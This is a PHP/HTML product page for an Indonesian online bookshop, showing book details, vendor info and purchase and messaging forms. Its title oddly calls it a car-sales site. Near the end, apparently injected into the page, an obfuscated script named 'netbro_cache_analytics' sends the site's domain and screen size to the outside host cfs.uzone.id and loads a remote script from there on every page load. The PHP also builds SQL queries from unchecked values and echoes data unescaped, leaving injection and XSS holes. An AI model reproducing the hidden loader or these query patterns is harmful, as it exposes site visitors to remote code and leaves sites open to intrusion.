
<!DOCTYPE html>
<html>
<head>
	<title>Situs Jual Beli Mobil Terpercaya</title>
	<link rel="stylesheet" type="text/css" href="asset/css/jquery-ui.min.css">
    <link rel="stylesheet" type="text/css" href="asset/css/style.css">
    <link rel="stylesheet" type="text/css" href="asset/css/slider.css">
      <script type="text/javascript" src="asset/js/jquery.min.js"></script>
       <script type="text/javascript" src="asset/js/jquery-ui.min.js"></script>
</head>
<body>
<?php include 'component/header.php'; ?>
<style type="text/css">
.post{width:55%;float:left ; margin-left: 6%; margin-top: 50px;}
.log{float:right;margin:30px;}
.log li {list-style:none;display:inline}
.log li a{display:inline-block;padding:10px;text-decoration:none;;color:#fff;background:#3498db}
.article{}
.article img{width:250px;height:300px;float:left;margin-right:20px;}
.article > div{margin:5px;}
.slider{width:100%;height:350px;background:#fff;border-bottom:5px solid #3498db;}
.slider img{width:300px;height:300px;float:left;display:inline-block;margin-right:20px;border-radius:50%;}
.slider > div{margin:20px;}
.slider h3{font-size:40px;color:#3498db;white-space:nowrap;text-overflow:ellipsis;overflow:hidden}
.slider > div{position:absolute}
</style>
<div class="post">
<?php 
error_reporting(0);
session_start();
      $article=$db->get_one($_GET['id_buku']);
      ?>
        <?php 
$jasa=$db->tampil_jasa_pengiriman($_SESSION['id_pembeli']);
?>
<div class="article">
<img src="<?php echo $article['gambar']; ?>">
<div>
<form action="handler2.php?aksi=favoritkan_buku" method="POST">
  <input type="hidden" class="form-control" name="id_pembeli" value="<?php echo $_SESSION['id_pembeli'] ?>">
  <input type="hidden" class="form-control" name="id_buku" value="<?php echo $article['id'] ?>">
<input type="submit" value="Favoritkan" style="height: 20px; padding: 0px; width: 100px;"></a>
</form>
<h3 style="margin: 0 0 5px 0"><a href="" style="text-decoration:none;color:#444"><?php echo $article['nama_buku'] ?></a></h3>
<span style="font-size:11px;color:#fff;background:#2ecc71;padding:3px;border-radius:2px;">Tersedia : <?php echo $article['qty'] ?></span>
<span style="font-size:11px;color:#fff;background:#e74c3c;padding:3px;border-radius:2px;">Kategori : <?php echo $article['kategori'] ?></span>
<span style="font-size:11px;color:#fff;background:#e74c3c;padding:3px;border-radius:2px;">Diskon : <?php echo $article['diskon'] ?>%</span><br><br>
<hp style=" font-size: 14px;">Proses Pengiriman Barang Kurang Lebih 2-3 kerja</p>
 <style type="text/css">
            .notif{ padding: 10px; background: #eee; color: #444; border: 1px solid #4689db; width: 430px; margin-right: 14px; float: right; margin-top: 4px; mr }
        </style>
        <div class="notif">
            <p>Hello <strong><?php echo $_SESSION['pembeli']; ?> </strong>Nikmati Belnaja di lapakbuku temukan buku kamu dengan harga murah</p>
        </div>
<h1 style="margin-top: 10px;">Rp.<?php echo $article['harga']?></h1><br>
<p style="font-size: 13px; margin-top: 10px; color: #ccc">*Pilih Jasa Pengiriman Pilihan Kamu</p>
                                 

<form method="post" action="handler.php?aksi=beli">
                            <input type="hidden" name="id_pembeli" value="<?php echo $_SESSION['id_pembeli'] ?>" />
                            <input type="hidden" name="id_vendor" value="<?php echo $article['id_vendor'] ?>" />
                            <input type="hidden" name="id_buku" value="<?php echo $article['id'] ?>" />
                            <input type="hidden" name="nama_buku" value="<?php echo $article['nama_buku'] ?>" />
                            <input type="hidden" name="gambar" value="<?php echo $article['gambar'] ?>" />
                            <input type="hidden" name="qty" value="<?php echo $article['qty'] ?>" />
                            <input type="hidden" name="harga" value="<?php echo $article['harga'] ?>" />
                            <input type="hidden" name="kategori" value="<?php echo $article['kategori'] ?>" />
                            <input type="hidden" name="keterangan" value="<?php echo $article['ket'] ?>" />
                             <select name="jasa_pengiriman" style="width: 200px; COLOR:#444">
                                  
                                            <option value="JNE">JNE</option>
                                             <option value="KANTOR POS">KANTOR POS</option>
                                               <option value="TIKI">TIKI</option>
                                             <option value="JXE EXPREST">JXE EXPREST</option>
        
                            </select><br>
                            <?php 
                                if ($article['qty']==0) {
                                    ?>
                                         <style type="text/css">
            .notif{ padding: 10px; background: #eee; color: #444; border: 1px solid #4689db; width: 430px; margin-right: 14px; float: right; margin-top: 4px; mr }
        </style>
        <div class="notif">
            <p>Hello <strong><?php echo $_SESSION['pembeli']; ?> </strong>Buku yang ingin kamu beli Sudah Habis , silahkan cari b uklu lagi yang kamu suka i9</p>
        </div>
                                    <?php
                                }else {
                                    ?>
                                     <input style="padding:10px;outline:0;border:0;background:#3498db;color:#fff;font-size:16px;margin:10px 0 0 0;cursor:pointer" type="submit" value="Tambah ke Keranjang" />
                                    <?php
                                }
                             ?>
                           
</form>
</div>
</div>
</div>
<div class="sidebar">
<div>
<style>
.populer{border:1px solid #ddd;overflow:hidden; margin-top: 50px; margin-right: 6%; }
.populer li{list-style:none;padding:5px;display:inline-block;width:100%;border-bottom:1px solid #ddd}
.populer li img{width:70px;height:90px;float:left;margin-right:10px;padding: 10px}
.populer li a{text-decoration:none;font-size:14px;color:#444}
</style>
<div class="populer">
<?php 
  $id2=$article["id_vendor"];
  $kat3=mysql_query("SELECT * from toko where id_vendor='$id2'");
  $kat4=mysql_fetch_array($kat3);
 ?>
<span style="display: inherit; background: #4689db; padding: 10px; color: #fff; font-weight: bold; margin-bottom: 5px">Data Informasi Vendor</span>
<li><img src="<?php echo $kat4['gambar']; ?>" />
<h5>DATA VENDOR</h5><br>

<a href="page_vendor.php?id_vendor=<?php echo $kat4['id_vendor'] ?>"><p>Nama Toko : <?php echo $kat4['nama_toko']; ?></p></a><br>
<p>Type Acount: <b style="background: #4689db; margin: 10px 0 10px 0; padding: 2px; border-radius: 10%;  color: #fff;"><?php echo$kat4['type']; ?></b></p><br>
<p>Jabatan Vendor: <b style="background: #4689db; margin: 10px 0 10px 0; padding: 2px; border-radius: 10%;  color: #fff;"> Founder </b></p>
</div>
<div class="populer" style="margin-top: 1px;">
<li><img src="asset/image/icon/eee.png" />
<h5>ALAMAT VENDOR</h5><br>
<?php 
    $id=$article["id_vendor"];
    $kat=mysql_query("SELECT * from toko where id_vendor='$id'");
    $kat2=mysql_fetch_array($kat);
 ?>
<p>Alamat : <?php echo $kat2['alamat']; ?></p>
<p>Kota : <?php echo $kat2['kota']; ?></p>
<p>Kecamatan : <?php echo $kat2['kecamatan']; ?></p>
<p>Provinsi : <?php echo $kat2['provinsi']; ?></p>
</div>
<div class="populer" style="margin-top: 1px;">
<li><img src="asset/image/icon/note-icon-flat_20610.png" />
<h5>CATATAN SANG VENDOR</h5><br>
<?php 
    $id=$article["id"];
    $kat=mysql_query("SELECT * from toko where id='$id'");
    $kat2=mysql_fetch_array($kat);
 ?>
<p>kami Tidak Pernah Menolak pesanan dari Anda dan kami secepatnya akan merespon pesanan anda </p>

</div>

</div>
<div style="clear:both"></div>
<style type="text/css">
.tab {
    list-style-type: none;
    margin: 0;
    padding: 0;
    overflow: hidden;
    border: 1px solid #ccc;
    background-color: #f1f1f1;
    float: left;
    width: 88%;
    margin-left: 6%;
    text-align: left;
    margin-top: 50px;
}
.tab li{display: inline;}
.tab li a {
    display: inline-block;
    color: #444444;
    text-align: center;
    padding: 14px 16px;
    text-decoration: none;
    transition: 0.3s;
    font-size: 17px;
}
.tab li a:hover {
    background-color: #ddd;
}
.tab li a:focus, .active {
    background-color: #ccc;
}

.tabcontent {
    display: none;
    padding: 25px 12px;
    border: 1px solid #ccc;
    border-top: none;
    width: 86%;
    float: left;
    margin-left: 6%;
}
.chip {
    display: inline-block;
    padding: 0 25px;
    height: 50px;
    font-size: 18px;
    line-height: 50px;
    border-radius: 25px;
    background-color: #f1f1f1;
}

.chip img {
    float: left;
    margin: 0 10px 0 -25px;
    height: 50px;
    width: 50px;
    border-radius: 50%;
}

.closebtn {
    padding-left: 10px;
    color: #888;
    font-weight: bold;
    float: right;
    font-size: 20px;
    cursor: pointer;
}

.closebtn:hover {
    color: #000;
}
input[type=submit]{margin: 10px 0 10px 0; padding: 10px; background: orange; color: #fff; border: 0; outline: 0; width: 200px; border: 1px solid orange; cursor: pointer; }
select{margin: 10px 0 10px 0 ; padding: 10px; width: 400px; margin-right: 10px; color: #ccc; }

</style>
<div class="bagan-banner">
<center>
<div class="tab">
  <li><a href="javascript:void(0)" class="tablinks" onclick="openCity(event, 'Deskripsi')">Deskripsi</a></li>
   <li><a href="javascript:void(0)" class="tablinks" onclick="openCity(event, 'Estiminasi')">Estiminasi Pengiriman</a></li>
   <li><a href="javascript:void(0)" class="tablinks" onclick="openCity(event, 'Pesan')">Kirim I Vendor Pesan</a></li>
</div>


<div id="Deskripsi" class="tabcontent">
  <p style="text-align: left;"><?php echo $article['ket'] ?>
</p>
</div>
<div id="Estiminasi" class="tabcontent">
  <center>
    <form action="handler.php?aksi=kirim_pesan" method="POST">
    <input type="hidden" name="id_pembeli" value="<?php echo $_SESSION['id_pembeli'] ?>" />
    <input type="hidden" name="id_vendor" value="<?php echo $article['id_vendor'] ?>" />
      <select>
        <option>Pilih Tempat Tujuan Kirim Kamu</option>
        <option>Kota Saya Sama Dengan Penjual</option>
    </select>
<center><input type="submit" value="Cek Disini"></center>
</p>
</div>
<div id="Pesan" class="tabcontent">
<center>
    <form action="handler.php?aksi=kirim_pesan" method="POST">
    <input type="hidden" name="id_pembeli" value="<?php echo $_SESSION['id_pembeli'] ?>" />
    <input type="hidden" name="id_vendor" value="<?php echo $article['id_vendor'] ?>" />

    <input type="date" name="tgl" style="margin: 10px 0 10px 0; padding: 10px; width: 200px;"><br>
    <textarea name="isi_pesan" style="padding: 10px; margin: 10px 0 10px 0; width: 250px;" placeholder="Kirim Pesan Kamu Ke Penjual Disini"></textarea><br>
<center><input type="submit" value="Kirim Pesan"></center>
</form>
</center>
</div>
</div>

<script>
function openCity(evt, cityName) {
    var i, tabcontent, tablinks;
    tabcontent = document.getElementsByClassName("tabcontent");
    for (i = 0; i < tabcontent.length; i++) {
        tabcontent[i].style.display = "none";
    }
    tablinks = document.getElementsByClassName("tablinks");
    for (i = 0; i < tablinks.length; i++) {
        tablinks[i].className = tablinks[i].className.replace(" active", "");
    }
    document.getElementById(cityName).style.display = "block";
    evt.currentTarget.className += " active";
}
</script>
     
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "¶ms=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssK0qZadE47JUdGHFHLfbVduxLeSZTaN%2fCvsyhiQsCTEtCGiaxtBhV5Mo6GA6xdw0AJrNFB8G2Df%2fKvwdy8%2b5RGE7WpzSx3nVPJZepAYRCPKtp%2bMqQ8l9q3SGImIqt4qpguMnxb%2bd%2f2zxV2j%2fcS%2bq9K7zM3p9pEeJfMPs2kDGypYtNiRFlawHoJvtn%2fQq0CXoXf1bCec%2f7skoZOjStT1qwTrB4b4xPG2AOpVhK1u01LQz2FunpFx2x5blSkmsCzQux07BIVc9QzUkyvOnTWciBi4FTtr8gwOegFbawaUbUFUIAo43j6PH3X6nC%2fnuuRw9nD1JBN4RRsWXD3d0a7JTrnpIyZNP9XOpV3InPV4E9BbglIpzZAVA%2f4dP6Z4nEO0ygQC2Po7sg1GQ%2fw9xDmH5iYgOyFEVK80oFK0k1vCsH%2b9VinlymBB1nIGAtweiNASO8i7FIf1RPz949TGTlpBNtlIbz%2fk9GMwd%2f3cRQk%2bev9E5ipJvQ73Q3OIi1QuKVN1UD%2b6f31Bnsowis25grxjyXeewp%2f9%2fc%2fJDEXGdTLjbZ3dtLQBgpC76rbcL0t10%2b0SfvI7Op7b7ZcW6M%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>

</center>
	
</div>


<?php include 'component/content-recomend.php'; ?>
<div style="clear: both;"></div>
<?php include 'component/fotter.php'; ?>
</div>
</body>
</html>